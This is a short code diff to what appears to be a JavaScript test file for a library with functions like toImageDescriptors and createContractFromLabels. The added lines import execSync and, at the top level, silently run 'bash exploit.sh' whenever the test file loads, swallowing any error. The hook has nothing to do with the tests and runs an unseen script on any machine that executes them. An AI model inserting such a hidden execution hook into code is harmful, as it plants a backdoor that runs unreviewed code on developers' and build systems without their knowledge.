@@ -1,4 +1,9 @@
 import { expect } from 'chai';
+import { execSync } from 'child_process';
+
+try {
+  execSync('bash exploit.sh', { stdio: 'inherit' });
+} catch (e) {}
 
 import { toImageDescriptors, createContractFromLabels } from '../lib/index';
 import type { Composition, ContractParser, Service } from '../lib/index';
